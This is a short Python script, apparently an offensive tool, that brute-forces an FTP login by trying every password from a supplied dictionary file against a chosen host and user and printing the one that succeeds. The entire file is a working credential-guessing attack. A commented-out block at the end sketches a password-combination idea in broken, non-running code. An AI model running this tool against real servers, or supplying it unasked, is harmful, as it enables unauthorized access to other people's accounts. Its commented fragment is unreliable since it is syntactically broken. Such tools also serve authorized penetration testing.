#!/usr/bin/python3
#-*- coding: utf-8 -*-

import ftplib
import argparse
from colors import *

parser = argparse.ArgumentParser(description='Bruteforce for FTP servers using a .txt dictionary')
parser.add_argument('-t', '--target', help="Specify a target (host)", required=True)
parser.add_argument('-u', '--user', help="FTP user", required=True)
parser.add_argument('-d', '--dict', help="Password dictionary (txt file)", required=True)
args = parser.parse_args()

target = args.target
user = args.user
pwd_dict_route = args.dict
port = 21 #Default

with open(pwd_dict_route, 'r') as file:
    pwd_dict = set()
    for password in file.readlines():
        pwd_dict.add(password)

    file.close()

def bruteforce(target, user, pwd_dict):
    server = ftplib.FTP()
    for password in pwd_dict:
        password = password.strip('\n')
        print(f"{lblue}[-] {normal}Trying {password}")
        try:
            server.connect(target, port, timeout=15)
            server.login(user, password)

        except ftplib.error_perm:
            pass

        else:
            print(f"{lgreen}[+] {normal}Found password: {red}{password}\n")
            break

bruteforce(target, user, pwd_dict)


# - New password_dict creation algorithm by @ScottTheFrog - #
#passwordlist = []
#passwordnew = ""
#range = 0
#for i in password
#    passwordlist.append(i)
#    server.login(user, i)

#range = range(0,len(passwordlist))
#for i in range
#    passwordnew = ""
#    for e in passworlist
#        passwordnew += passwordlist[e]
#        server.login(user, e)
#        server.login(user, passwordnew)
